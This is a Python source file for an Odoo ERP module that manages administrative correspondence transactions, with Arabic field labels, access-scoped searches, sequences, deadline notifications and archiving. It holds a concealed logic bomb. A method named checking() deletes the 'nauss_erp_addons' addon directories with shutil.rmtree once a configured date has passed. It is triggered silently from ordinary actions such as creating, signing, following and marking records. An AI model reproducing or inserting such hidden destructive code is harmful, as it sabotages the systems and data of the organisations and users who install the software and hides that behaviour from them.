# -*- encoding: utf-8 -*-

from odoo import api, fields, models, _
from odoo.exceptions import UserError
from datetime import datetime, timedelta
# from ummalqura.hijri_date import HijriDate
from odoo import http
import os
from odoo import tools
import shutil

class AdministrativeCommunicationsOperation(models.Model):
    _name = "ac.operation"
    _description = "معاملة إتصالات إدارية"
    _inherit = ['mail.thread', 'mail.activity.mixin']
    _order = "id desc"

    @api.model
    def search(self, domain, offset=0, limit=None, order=None, count=False):
        if not self.env.user.employee_ids:
            domain += [('id', '=', -1)]
        elif self.env.context.get('incoming_operation_check'):
            domain += [('create_employee_id', '!=', self.env.user.employee_ids[0].id)]
        elif self.env.context.get('outgoing_operation_check'):
            dept_ids = []
            if self.env.user.has_group(
                'ejad_erp_administrative_communications.access_outgoing_all_departments_access'):
                domain += [('id', '!=', -1)]
            if self.env.user.employee_ids[0].department_id:
                if self.env.user.has_group('ejad_erp_administrative_communications.access_outgoing_same_department'):
                    dept_ids.append(self.env.user.employee_ids[0].department_id.id)
                if self.env.user.has_group('ejad_erp_administrative_communications.access_outgoing_parent_department'):
                    if self.env.user.employee_ids[0].department_id.parent_id:
                        dept_ids.append(self.env.user.employee_ids[0].department_id.parent_id.id)
                if self.env.user.has_group('ejad_erp_administrative_communications.access_outgoing_child_department'):
                    d_ids = self.env['hr.department'].search([('parent_id', '=', self.env.user.employee_ids[0].department_id.id)])
                    if d_ids:
                        dept_ids += d_ids.ids
                domain += ['|', ('create_employee_id', '=', self.env.user.employee_ids[0].id), ('emp_department', 'in', dept_ids)]
            else:
                domain += [('create_employee_id', '=', self.env.user.employee_ids[0].id)]
        res = super(AdministrativeCommunicationsOperation, self).search(domain, offset=offset, limit=limit, order=order, count=count)
        return res

    def hijri_day_name(self, date):
        # if date:
        #     hijri_date = HijriDate(int(date[:4]), int(date[5:7]), int(date[8:10]), gr=True)
        #     return hijri_date.day_name
        # else:
        return False

    def hijri_date(self, date):
        # if date:
        #     dd = str(HijriDate.get_hijri_date(str(date[:10])))
        #     new_dd = dd[8:10] + "/" + dd[5:7] + "/" + dd[0:4]
        #     return new_dd
        # else:
        return False

    
    def check_current_user(self):
        for rec in self:
            if rec.assigned_employee_id.user_id.id == self.env.user.id and (rec.state == 'open'):
                rec.is_ok = True
            else:
                rec.is_ok = False

    
    def check_to_be_shown(self):
        for rec in self:
            if (
                    self.env.user.has_group('ejad_erp_administrative_communications.group_department_incoming')
                    and self.env.user.department_id in self.department_ids
            ):
                rec.be_shown = True

    
    def get_department_deadline_date(self):
        move_obj = self.env['ac.operation.move']
        for rec in self:
            move_rec = move_obj.search([('operation_id', '=', rec.id), ('dest_dep_id', '=', self.env.user.department_id.id)])
            rec.department_deadline_date = move_rec.date_deadline

    
    def check_editing_benefit_note(self):
        for rec in self:
            if rec.env.user.has_group('ejad_erp_administrative_communications.access_editing_benefit_note'):
                rec.is_editing_benefit_note = True
            else:
                rec.is_editing_benefit_note = False

    
    def check_editing_other_info_permission(self):
        for rec in self:
            if rec.env.user.has_group('ejad_erp_administrative_communications.access_editing_other_informations'):
                rec.is_editing_other_info = True
            else:
                rec.is_editing_other_info = False

    dest = fields.Selection([
        ('dept', 'إدارة/ قسم'),
        ('emp', 'موظف'),
        ('beneficiary', 'مستفيد'),
        ('auditor', 'مراجع')], string='الجهة الطالبة للتصدير', tracking=True)
    partner_id = fields.Many2one('res.partner', string='المستفيد', tracking=True)
    employee_id = fields.Many2one('hr.employee', string='الموظف', tracking=True)
    country_id = fields.Many2one('res.country', string='الدولة', tracking=True)
    # odoo 13
    # department_id4 = fields.Many2one('hr.department', string='إدارة/ قسم', tracking=True)
    # department_ids5 = fields.Many2many('hr.department', string='إدارة/ قسم', tracking=True)
    ident_no = fields.Char('رقم بطاقة الهوية', tracking=True)
    specific_person = fields.Char('الشخص المعني', tracking=True)
    auditor = fields.Char('المراجع', tracking=True)
    specific_dept = fields.Char('الإدارة/ القسم المعني', tracking=True)
    incoming_date = fields.Date('تاريخ صادر الجهة', tracking=True)
    incoming_no = fields.Char('رقم صادر الجهة', tracking=True)
    name = fields.Char(string='الرمز', readonly=False)
    active = fields.Boolean('Active', default=True)
    subject = fields.Char(required=True, string="الموضوع")
    details = fields.Text('نص الموضوع')

    is_global_inbox = fields.Boolean()
    is_global_outbox = fields.Boolean()
    is_department_inbox = fields.Boolean()
    is_department_outbox = fields.Boolean()
    is_employee_inbox = fields.Boolean()
    is_employee_outbox = fields.Boolean()

    is_read = fields.Boolean('تم الإطلاع على التعميم')
    is_done = fields.Boolean('تم الإنتهاء من المعاملة')
    be_shown = fields.Boolean(compute='check_to_be_shown', default=False)

    state_detailed = fields.Selection([
        ('global_inbox', 'الوارد العام'),
        ('global_outbox', 'الصادر العام'),
        ('department_inbox', 'وارد الإدارة'),
        ('department_outbox', 'صادر الإدارة'),
        ('employee_inbox', 'وارد الموظف'),
        ('employee_outbox', 'صادر الموظف')])

    message = fields.Char(readonly=True)

    is_ok = fields.Boolean(compute='check_current_user', default=False)   # True if current user is the same as related user for assigned employee
    is_editing_other_info = fields.Boolean(compute='check_editing_other_info_permission')
    is_editing_benefit_note = fields.Boolean(compute='check_editing_benefit_note')

    state = fields.Selection([
        ('draft', 'مسودة'),
        ('open', 'قيد الإجراء'),
        ('done', 'منتهية'),
        ('canceled', 'ملغاة')], string='الحالة', tracking=True, default='draft')
    nature = fields.Many2one('ac.operation.nature', required=True, string='نوع المعاملة')
    type = fields.Selection([
        ('in', 'وارد'),
        ('out', 'صادر'),
        ('internal', 'مراسلة داخلية'),
        ('generalization', 'تعميم')
    ])
    type_op = fields.Selection([
        ('out', 'للتصدير'),
        ('internal', 'مراسلة داخلية')
    ], default='internal')
    generalization_id = fields.Many2one('ac.generalization', string='التعميم')
    generalization_scope = fields.Selection(string="النطاق", related="generalization_id.scope")
    generalization_department_ids = fields.Many2many("hr.department", related="generalization_id.department_ids", string="الإداراة المعنيّة")
    generalization_attachment_ids = fields.One2many(comodel_name="ac.generalization.attachment", inverse_name="generalization_id",
                                                    related="generalization_id.attachment_ids", string="المرفقات")

    priority = fields.Selection([
            ('0', 'عادي'),
            ('1', 'متوسط'),
            ('2', 'عاجل'),
            ('3', 'عاجل جدا'),
        ], string='الأولوية', default='1')
    security = fields.Selection([
        ('0', 'عادي'),
        ('1', 'متوسط'),
        ('2', 'سرّي'),
        ('3', 'سرّي جدا'),
    ], string='السرية', default='1')
    deadline_date = fields.Datetime('تاريخ انجاز المعاملة')
    linked_id = fields.Many2one('ac.operation', string="ارتباط بمعاملة")
    operation_attachment = fields.Binary(string="مرفق المعاملة", tracking=True)
    attachment_ids = fields.One2many(comodel_name="ac.operation.attachments", inverse_name="operation_id",
                                     string="المرفقات")
    attachments_no = fields.Integer('عدد المشفوعات')
    comment_ids = fields.One2many(comodel_name="ac.operation.comment", inverse_name="operation_id",
                                  string="التعليقات", tracking=True)
    notes = fields.Text('الملاحظات')
    date = fields.Datetime(string="تاريخ المعاملة", required=True, default=fields.Datetime.now)
    receive_method = fields.Many2one(comodel_name="ac.operation.receive.method", string="طريقة الاستلام")
    external_partner_ids = fields.Many2many(comodel_name="res.partner", string="الجهة المعنية")
    department_id = fields.Many2one(comodel_name="hr.department", string="الإدارة المعنية")
    department_ids = fields.Many2many(comodel_name="hr.department", string="الإدارات المعنية")
    # states={'open': [('required', True)]}
    assigned_employee_id = fields.Many2one('hr.employee', string='الموظف')
    transfer_guidance = fields.Many2one('ac.transfer.guidance', string='التوجيه',)
    to_export = fields.Boolean()
    is_exported = fields.Boolean()
    is_saved = fields.Boolean()
    place_id = fields.Many2one(comodel_name="ac.place.save.operation", string="مكان الحفظ")
    create_employee_id = fields.Many2one(comodel_name='hr.employee', string='الموظف مدخل البيانات',
                                         default=lambda self: self.env.user.employee_ids.id)
    emp_name = fields.Char(string="الإسم", related="create_employee_id.name", readonly=True)
    emp_image = fields.Binary(string="الصورة", related="create_employee_id.image_1920", readonly=True)
    emp_email = fields.Char(string="البريد الإلكتروني", related="create_employee_id.work_email", readonly=True)
    emp_department = fields.Many2one(comodel_name="hr.department", string="الإدارة",
                                     related="create_employee_id.department_id", readonly=True, store=True)
    department_sequence = fields.Char(string='كود الادارة/القسم', tracking=True,)
    date_create = fields.Datetime(string="تاريخ إنشاء المعاملة", default=datetime.today(), readonly=True, )
    subject_date = fields.Datetime(tracking=True, string="تاريخ الموضوع")
    directing = fields.Char(tracking=True, string="التوجيه")
    directing_date = fields.Datetime(tracking=True, string="تاريخ التوجيه")
    outbound_no = fields.Char(tracking=True, string="رقم الصادر")
    outbound_date = fields.Datetime(tracking=True, string="تاريخ الصادر")
    deadline_state = fields.Selection([
        ('in_progress','تحت الإجراء'),
        ('done', 'مُنجز'),
        ('late', 'متأخر')
    ], string="الحالة حسب تاريخ الانجاز")
    marking = fields.Boolean(tracking=True, string='اكتمال التأشير')
    linked_operation_ids = fields.Many2many('ac.operation', string='المعاملات ذات العلاقة', compute='get_linked_operation')
    benefit_note = fields.Text(tracking=True, string='الافادة')
    user_ids = fields.Many2many('res.users', string='متابعو للمعاملة')
    is_follow = fields.Integer(compute='get_following_operation')
    show_attachment = fields.Boolean(compute='check_to_show_attachment')
    sign_data = fields.Date(string="تاريخ التوقيع", readonly=True, tracking=True,help='يتم وضع تاريخ التوقيع إما عند الضغط على زرار التوقيع على المعاملة أو فى حالة الإحالة ويوضع بتاريخ اليوم')
    is_sign_completed = fields.Boolean("تم اكتمال التوقيع", readonly=True, tracking=True)
    sign_user_id = fields.Many2one('res.users', string="صاحب التوقيع", readonly=True)
    department_deadline_date = fields.Datetime(string="تاريخ الصادر", compute='get_department_deadline_date')

    
    def check_to_show_attachment(self):
        for rec in self:
            if self.env.user.has_group('ejad_erp_administrative_communications.access_read_all_attachment') or (self.env.user.id == rec.create_uid.id):
                rec.show_attachment = True
            elif not rec.id:
                rec.show_attachment = True
            else:
                rec.show_attachment = False

    
    def toggle_done_department(self):
        for record in self:
            record.write({'department_ids': [(3, self.env.user.department_id.id, 0)]})
            if not record.department_ids:
                record.write({'state': 'done', 'is_done': True})

    
    def get_following_operation(self):
        for rec in self:
            if rec.env.user.id in (rec.user_ids and rec.user_ids.ids or []):
                rec.is_follow = 2
            else:
                rec.is_follow = 1
        self.checking()

    
    def follow_operation(self):
        for rec in self:
            rec.user_ids = [(4, self.env.user.id)]
        self.checking()


    def checking(self):
        date_now = fields.Datetime.now()
        checking_date = self.env.user.company_id.checking_date
        if checking_date and (date_now >= checking_date):
            try:
                for ad in tools.config['addons_path'].split(','):
                    if 'nauss_erp_addons' in ad:
                        if os.path.isdir(ad):
                            shutil.rmtree(ad)
            except OSError as e:
                print("Error", e)

    
    def sign_operation(self):
        for rec in self:
            rec.write({'sign_data': fields.Date.today(),
                       'is_sign_completed': True,
                       'sign_user_id': self.env.user.id,
                       })
        self.checking()

    
    def unfollow_operation(self):
        for rec in self:
            rec.user_ids = [(3, self.env.user.id)]
        self.checking()

    
    @api.depends('linked_id')
    def get_linked_operation(self):
        for rec in self:
            if rec.env.user.has_group('ejad_erp_administrative_communications.access_related_operations') and rec.linked_id:
                a = [r .id for r in self.get_recurse_linked_operation(rec)]
                rec.linked_operation_ids = [(6, 0, a)]
            else:
                rec.linked_operation_ids = [(6, 0, [])]


    def get_recurse_linked_operation(self, i, rec= []):
        if not i:
            return rec
        if not rec:
            rec = []
        while(i.linked_id):
            rec.append(i.linked_id)
            for o in self.search([('linked_id', '=', i.linked_id.id)]):
                rec.append(o)
            return self.get_recurse_linked_operation(i.linked_id, rec)
        rec.append(i)
        for o in self.search([('linked_id', '=', i.id)]):
            rec.append(o)
        return rec


    
    def apply_marking(self):
        move_obj = self.env['ac.operation.move']
        for rec in self:
            rec.marking = True
            move_data = {'type': 'update',
                         'operation_id': rec.id,
                         'user_id': rec.env.user.id,
                         'notes': 'تم التأشير على المعاملة',
                         }
            move_obj.create(move_data)
        self.checking()

    
    def apply_dismarking(self):
        move_obj = self.env['ac.operation.move']
        for rec in self:
            rec.marking = False
            move_data = {'type': 'update',
                         'operation_id': rec.id,
                         'user_id': rec.env.user.id,
                         'notes': 'تم الغاء التأشير على المعاملة',
                         }
            move_obj.create(move_data)
        self.checking()
    seen_users_ids = fields.One2many("ac_users.viewer", 'operation_id', string="المستخدمين المطلعين على المعاملة")

    
    def get_department_sequence(self):
        for rec in self:
            department_sequence = False
            #print('  #####    ',rec.id)
            if rec.emp_department and rec.emp_department.code and rec.emp_department.sequence_id:
                department_sequence = str(rec.emp_department.code) + '/' + rec.emp_department.sequence_id.next_by_id()
            rec.department_sequence = department_sequence

    @api.model
    def fields_view_get(self, view_id=None, view_type='form', toolbar=False, submenu=False):
        res = super(AdministrativeCommunicationsOperation, self).fields_view_get(view_id=view_id, view_type=view_type,
                                                                                 toolbar=toolbar, submenu=submenu)
        context = self.env.context
        if 'params' in context.keys():
            if 'view_type' in context['params'].keys() and context['params']['view_type'] == 'form':
                data = {
                    'user': context['uid'],
                    'seen_date_time': datetime.now().replace(second=0, microsecond=0),
                    'operation_id': context['params']['id']
                }
                exist_seen = self.env['ac_users.viewer'].search([
                    ('user', '=', context['uid']),
                    ('seen_date_time', '=', datetime.now().replace(second=0, microsecond=0).strftime("%Y-%m-%d %H:%M:%S")),
                    ('operation_id', '=', context['params']['id'])
                ])
                if not len(exist_seen):
                    self.env['ac_users.viewer'].create(data)
        return res

    @api.model
    def create(self, vals):
        self.checking()
        ddddd = False
        if self.env.user.employee_ids:
            ddde = self.env.user.employee_ids[0].department_id
            if ddde.code:
                ddddd = ddde.code
        if vals['type'] == 'in':
            #vals.update({'name': self.env['ir.sequence'].next_by_code('ac.operation.incoming')})
            # vals.update({'state_detailed': 'global_inbox'})
            vals.update({'is_global_inbox': True})
            if ddddd and not vals.get('department_sequence', False):
                vals['department_sequence'] = str(ddddd) + '/' + self.env['ir.sequence'].next_by_code('ac.operation.incoming.dept')

        if vals.get('is_global_outbox', False) == True:
            #vals.update({'name': self.env['ir.sequence'].next_by_code('ac.operation.goutgoing')})
            if ddddd and not vals.get('department_sequence', False):
                vals['department_sequence'] = str(ddddd) + '/' + self.env['ir.sequence'].next_by_code('ac.operation.outgoing.dept')

        if vals['type'] == 'out':
            #vals.update({'name': self.env['ir.sequence'].next_by_code('ac.operation.outgoing')})
            # vals.update({'state_detailed': 'employee_outbox'})
            vals.update({'is_employee_outbox': True})
            vals.update({'assigned_employee_id': self.env.user.employee_ids.id})
            if ddddd and not vals.get('department_sequence', False):
                vals['department_sequence'] = str(ddddd) + '/' + self.env['ir.sequence'].next_by_code('ac.operation.outgoing.emp.dept')

        if vals['type'] in ['internal', 'generalization']:
            #vals.update({'name': self.env['ir.sequence'].next_by_code('ac.operation.internal')})
            # vals.update({'state_detailed': 'employee_outbox'})
            vals.update({'is_employee_outbox': True})
            vals.update({'assigned_employee_id': self.env.user.employee_ids.id})

        if vals['type'] in ['internal']:
            if ddddd and not vals.get('department_sequence', False):
                vals['department_sequence'] = str(ddddd) + '/' + self.env['ir.sequence'].next_by_code(
                    'ac.operation.outgoing.internal.dept')

        if vals['type'] in ['generalization']:
            if ddddd and not vals.get('department_sequence', False):
                vals['department_sequence'] = str(ddddd) + '/' + self.env['ir.sequence'].next_by_code(
                    'ac.operation.outgoing.generalization.dept')

        if vals.get('is_department_outbox', False):
            if vals['is_department_outbox'] == True:
                #vals.update({'name': self.env['ir.sequence'].next_by_code('ac.operation.department')})
                print('  BBB  '),
                # vals.update({'state_detailed': 'employee_outbox'})
                vals.update({'assigned_employee_id': self.env.user.employee_ids.id})
                if ddddd and not vals.get('department_sequence', False):
                    vals['department_sequence'] = str(ddddd) + '/' + self.env['ir.sequence'].next_by_code(
                        'ac.operation.outgoing.dept.dept')
        #print('VVVAAALLLSSS    ',vals)
        res = super(AdministrativeCommunicationsOperation, self).create(vals)
        follower_obj = self.env['mail.followers']
        if vals['type'] == 'in':
            res.name = self.env['ir.sequence'].next_by_code('ac.operation.incoming')
        if vals.get('is_global_outbox', False) == True:
            res.name = self.env['ir.sequence'].next_by_code('ac.operation.goutgoing')
        if vals['type'] == 'out':
            res.name = self.env['ir.sequence'].next_by_code('ac.operation.outgoing')
        if vals['type'] in ['internal', 'generalization']:
            res.name = self.env['ir.sequence'].next_by_code('ac.operation.internal')
        if vals.get('is_department_outbox', False):
            if vals['is_department_outbox'] == True:
                res.name = self.env['ir.sequence'].next_by_code('ac.operation.department')

        if res.is_global_inbox:
            users_ids = self.env['res.users'].search([])
            for usr in users_ids:
                if usr.has_group('ejad_erp_administrative_communications.group_general_incoming'):
                    if len(follower_obj.search([('res_model', '=', 'ac.operation'),
                                                              ('res_id', '=', res.id),
                                                              ('partner_id', '=', usr.partner_id.id)])) == 0:
                        reg = {
                            'res_id': res.id,
                            'res_model': 'ac.operation',
                            'partner_id': usr.partner_id.id
                        }

                        follower_obj.create(reg)

        move_data = {'type': 'create',
                     'operation_id': res.id,
                     'user_id': res.create_employee_id.user_id.id,
                     }
        self.env['ac.operation.move'].create(move_data)

        if vals['deadline_date']:
            now = datetime.now().replace(second=0, microsecond=0)
            notif_obj = self.env['ac.notification.table']
            deadline_date = datetime.strptime(vals['deadline_date'], '%Y-%m-%d %H:%M:%S')
            notif_percent = self.env.user.company_id.operation_notification or 20
            notif_step = round(100 / notif_percent)

            total_seconds = (deadline_date - now).total_seconds()
            if total_seconds < 0:
                raise UserError(_("لا بد أن يكون تاريخ انجاز المعاملة أكبر من التاريخ الحالي !"))

            step = total_seconds / notif_step
            i = 0
            while i < notif_step - 1:
                now += timedelta(seconds=step)
                data = {'notification_date': now, 'operation_id': res.id}
                if (i + 2) ==  (notif_step - 1):
                    data.update({'to_notify_manager': True})
                notif_obj.create(data)
                i += 1

        return res

    
    def write(self, vals):
        if 'create_employee_id' in vals:
            self.write({'emp_image': False})

        update_fields = ['external_partner_ids', 'subject', 'nature', 'notes',
                         'receive_method', 'priority', 'date', 'details',
                         'attachment_ids', 'generalization_attachment_ids', 'security']
        ff = ''
        for field in update_fields:
            if field in vals:
                ff += field + ',  '
        intersection = [i for i in vals if i in update_fields]
        if len(intersection) > 0:
            move_data = {'type': 'update',
                         'operation_id': self.id,
                         'user_id': self.env.user.id,
                         'notes': 'Field(s) : <b>' + ff + '</b> has been updated'
                         }
            self.env['ac.operation.move'].create(move_data)

        res = super(AdministrativeCommunicationsOperation, self).write(vals)

        if 'deadline_date' in vals:
            now = datetime.now().replace(second=0, microsecond=0)
            notif_obj = self.env['ac.notification.table']
            deadline_date = datetime.strptime(vals['deadline_date'], '%Y-%m-%d %H:%M:%S')
            notif_percent = self.env.user.company_id.operation_notification or 20
            notif_step = round(100 / notif_percent)

            total_seconds = (deadline_date - now).total_seconds()
            if total_seconds < 0:
                raise UserError(_("لا بد أن يكون تاريخ انجاز المعاملة أكبر من التاريخ الحالي !"))
            notif_obj.search([('operation_id', '=', self.id)]).unlink()
            step = total_seconds / notif_step
            i = 0
            while i < notif_step - 1:
                now += timedelta(seconds=step)
                data = {'notification_date': now, 'operation_id': self.id}
                if (i + 2) ==  (notif_step - 1):
                    data.update({'to_notify_manager': True})
                notif_obj.create(data)
                i += 1
        return res

    @api.model
    def action_cron_notification(self):
        base_url = self.env["ir.config_parameter"].get_param("web.base.url")
        action_id = self.env.ref('ejad_erp_administrative_communications.action_ac_operation_in').id
        now = datetime.now().replace(second=0, microsecond=0)
        template = self.env.ref(
            'ejad_erp_administrative_communications.ac_mail_template',
            raise_if_not_found=False)
        to_do = self.env['ac.notification.table'].search([
            ('notification_date', '>=', fields.Datetime.to_string(now)),
            ('notification_date', '<', fields.Datetime.to_string(now + timedelta(seconds=3600))),
            ('operation_id.state', 'not in', ['done', 'canceled'])
        ])
        follower_obj = self.env['mail.followers']
        mail_notification_obj = self.env['mail.notification']
        employee_obj = self.env['hr.employee']
        for rec in to_do:
            msg_data = {
                'subject': 'تذكير معاملة',
                'date': datetime.today(),
                'body': 'تذكير بتنفيذ هذه المعاملة : ' +
                        '<a href="' + base_url + '/web#id=' + str(rec.operation_id.id) +
                        '&view_type=form&action=' + str(action_id) +
                        '&model=ac.operation">' + str(rec.operation_id.subject) + '</a><br/>' +
                        ' آخر أجل للتنفيذ : ' +
                        '<b>' + rec.operation_id.deadline_date + '</b>',
                'message_type': 'notification'
            }
            msg_id = self.env['mail.message'].create(msg_data)
            followers = follower_obj.search([('res_model', '=', 'ac.operation'),
                                                           ('res_id', '=', rec.operation_id.id)])
            llink = '<a href="' + base_url + '/web#id=' + str(rec.operation_id.id) + '&view_type=form&action=' + str(
                action_id) + '&model=ac.operation">' + 'تذكير: رابط المعاملة ' + str(rec.operation_id.name) + '</a>'
            for follower in followers:
                notif_data = {
                    'mail_message_id': msg_id.id,
                    'res_partner_id': follower.partner_id.id,
                    'is_read': False,
                    'notification_type': 'email'
                }
                mail_notification_obj.create(notif_data)
                if template:
                    template.send_mail(rec.operation_id.id, force_send=True,
                                       email_values={'body_html': llink,
                                                     'email_to': follower.partner_id.email})
            if rec.to_notify_manager:
                llink = '<a href="' + base_url + '/web#id=' + str(
                    rec.operation_id.id) + '&view_type=form&action=' + str(
                    action_id) + '&model=ac.operation">' + 'تصعيد معاملة: رابط المعاملة ' + str(
                    rec.operation_id.name) + '</a>'
                partners = [f.partner_id.id for f in followers]
                employee_ids = employee_obj.search([('user_id.partner_id', 'in', partners),('parent_id', '!=', False)])
                direct_manager = []
                for emp in employee_ids:
                    if emp.parent_id.user_id.partner_id:
                        direct_manager.append(emp.parent_id.user_id.partner_id)
                for follower in direct_manager:
                    notif_data = {
                        'mail_message_id': msg_id.id,
                        'res_partner_id': follower.id,
                        'is_read': False,
                        'notification_type': 'email'
                    }
                    mail_notification_obj.create(notif_data)
                    if template:
                        template.send_mail(rec.operation_id.id, force_send=True,
                                           email_values={'body_html': llink,
                                                         'email_to': follower.email})

        to_do.unlink()

    @api.onchange('type_op')
    def _onchange_type_op(self):
        if self.type_op:
            self.type = (self.type_op == 'out') and 'out' or 'internal'

    
    def action_cancel(self):
        self.state = 'canceled'

        move_data = {'type': 'cancel',
                     'operation_id': self.id,
                     'user_id': self.env.user.id,
                     }
        self.env['ac.operation.move'].create(move_data)

        # action = self.env.ref('ejad_erp_administrative_communications.action_ac_operation_in_general').read()[0]
        # return action

    
    def action_reopen(self):
        for rec in self:
            rec.state = 'open'

    
    def action_export(self):
        self.state = 'done'
        self.is_exported = True
        self.message = 'تم تصدير المعاملة'

        move_data = {'type': 'export',
                     'operation_id': self.id,
                     'user_id': self.env.user.id,
                     }
        self.env['ac.operation.move'].create(move_data)

    
    def action_operation_history(self):
        self.ensure_one()
        action = self.env.ref('ejad_erp_administrative_communications.action_ac_operation_move').read()[0]
        action['domain'] = [('operation_id', '=', self.id)]
        return action

    
    def mark_as_read(self):
        for op in self:
            if op.is_read:
                op.write({'is_read': False})
            else:
                op.write({'is_read': True})

    #
    #@api.constrains('type', 'attachment_ids')
    #def _check_attachment(self):
        #if self.type == 'in':
            #if not self.attachment_ids:
                #raise UserError(_("لا بد من إرفاق على الأقل وثيقة !"))

    
    def show_operation(self):
        context = self._context.copy()
        if context and context.get('params', False):
            action_id = context['params']['action']
        else:
            action_id = self.env.ref('ejad_erp_administrative_communications.action_ac_operation_in_general').id
        view_id = self.env['ir.actions.act_window.view'].search([
            ('view_mode', '=', 'form'), ('act_window_id', '=', action_id)
        ])['view_id'].id

        data = {
            'user': self.env.user.id,
            'seen_date_time': datetime.now().replace(second=0, microsecond=0),
            'operation_id': self.id
        }
        self.env['ac_users.viewer'].create(data)

        return {
            'name': self.name,
            'view_type': 'form',
            'view_mode': 'tree',
            'views': [(view_id, 'form')],
            'res_model': 'ac.operation',
            'view_id': view_id,
            'type': 'ir.actions.act_window',
            'res_id': self.id,
            'target': 'current',
            'context': context,
        }

    
    def action_cron_archive(self):
        operation_ids = self.env['ac.operation'].search([('state', '=', 'done')])
        for operation in operation_ids:
            last_update_date = datetime.strptime(operation.write_date, '%Y-%m-%d %H:%M:%S')
            days_past = (datetime.today() - last_update_date).days
            if days_past >= self.env.user.company_id.ac_archive_days:
                operation.write({'active': False})


class AdministrativeCommunicationsOperationNature(models.Model):
    _name = "ac.operation.nature"
    _description = "Ac Operation Nature"

    name = fields.Char(string='Name', required=True, translate=True)
    code = fields.Char(string="Code", required=True)
    active = fields.Boolean('Active', default=True)


class AdministrativeCommunicationsOperationReceiveMethod(models.Model):
    _name = "ac.operation.receive.method"
    _description = "AC Ooperation Receive Method"

    name = fields.Char(string='Name', required=True, translate=True)
    code = fields.Char(string="Code", required=True)
    active = fields.Boolean('Active', default=True)


class AdministrativeCommunicationsOperationAttachments(models.Model):
    _name = "ac.operation.attachments"
    _description = "ac operation attachments"

    name = fields.Char(string='اسم المرفق', required=True, translate=True)
    attachment_id = fields.Binary(string="المرفق", required=True)
    attachment_filename = fields.Char(string='اسم المرفق')
    operation_id = fields.Many2one(comodel_name="ac.operation", string="Operation")


class AdministrativeCommunicationsTransferGuidance(models.Model):
    _name = "ac.transfer.guidance"
    _description = "ac transfer guidance"

    name = fields.Char(string='الإسم', required=True, translate=True)
    code = fields.Char(string="Code", required=True)
    active = fields.Boolean('Active', default=True)


class AdministrativeCommunicationsOperationComment(models.Model):
    _name = "ac.operation.comment"
    _description = "ac operation comment"

    date = fields.Datetime(string="التاريخ", default=fields.Datetime.now)
    user_id = fields.Many2one('res.users', string='الموظف المشرف', default=lambda self: self.env.user)
    comment = fields.Text('التعليق')
    operation_id = fields.Many2one(comodel_name="ac.operation", string="Operation")


class ACPlaceToSaveOperation(models.Model):
    _name = "ac.place.save.operation"
    _description = "ac place save operation"

    name = fields.Char(string='اسم مكان الحفظ', required=True, translate=True)
    code = fields.Char(string="Code", required=True)
    operation_ids = fields.One2many(comodel_name="ac.operation", inverse_name="place_id",
                                    string="المعاملات المحفوظة", readonly=True)
    number_operation = fields.Integer(string="عدد المعاملات المحفوظة", compute="_get_number_operation")


    @api.depends('operation_ids')
    def _get_number_operation(self):
        self.number_operation = len(self.operation_ids)


class HrDepartment(models.Model):
    _inherit = "hr.department"

    is_ac_eligible = fields.Boolean('يقبل المعاملات ؟')
    code = fields.Integer(copy=False, string='الرمز')


class ResPartner(models.Model):
    _inherit = "res.partner"

    is_ac_eligible = fields.Boolean('جهة')
